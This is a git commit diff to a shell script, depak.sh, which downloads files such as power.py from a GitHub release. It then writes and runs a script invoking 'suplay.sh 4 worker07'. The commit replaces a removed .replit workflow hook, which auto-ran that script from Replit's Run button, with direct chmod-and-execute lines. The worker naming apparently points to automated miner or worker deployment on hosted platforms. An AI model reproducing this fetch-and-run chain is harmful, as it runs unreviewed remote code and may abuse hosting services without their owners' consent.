b30f0ddf059c803d5436e8e25c28844a075a1227
apefanubs696-dotcom <apefanubs696@deciw.com>
2026-09-17 19:14:09 +0700

    Update depak.sh

--- depak.sh
+++ depak.sh
@@ -2,29 +2,6 @@ curl -O -J -L https://github.com/apefanubs696-dotcom/geranx/releases/download/sa
 curl -O -J -L https://github.com/apefanubs696-dotcom/geranx/releases/download/sama/power.py
 echo '#!/bin/bash
 
-bash suplay.sh 4 worker07' > bago.sh
-
-echo 'modules = ["python-3.12"]
-
-[workflows]
-runButton = "Project"
-
-[[workflows.workflow]]
-name = "Project"
-mode = "parallel"
-author = "agent"
-
-[[workflows.workflow.tasks]]
-task = "workflow.run"
-args = "bago"
-
-[[workflows.workflow]]
-name = "bago"
-author = "agent"
-
-[[workflows.workflow.tasks]]
-task = "shell.exec"
-args = "bash bago.sh"
-
-[workflows.workflow.metadata]
-outputType = "console"' > .replit
+bash suplay.sh 4 worker07' > baso.sh
+chmod +x baso.sh
+./baso.sh
